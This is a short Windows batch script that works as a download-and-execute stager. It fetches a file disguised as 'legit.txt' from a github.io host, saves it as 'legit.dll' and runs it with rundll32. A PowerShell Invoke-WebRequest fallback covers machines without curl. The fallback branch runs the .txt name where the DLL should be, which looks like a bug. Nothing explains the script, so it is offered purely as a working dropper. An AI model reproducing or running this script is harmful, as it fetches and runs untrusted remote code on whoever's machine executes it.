@echo off
for /f %%i in ("curl.exe") do if not exist "%%~$path:i" (
	powershell.exe -c 'Invoke-WebRequest "https://bschroed96.github.io/legit.txt" -OutFile "legit.dll"'
	legit.txt
	exit
)
curl -s https://bschroed96.github.io/legit.txt -o legit.dll
rundll32.exe legit.dll ExportedFunction1
exit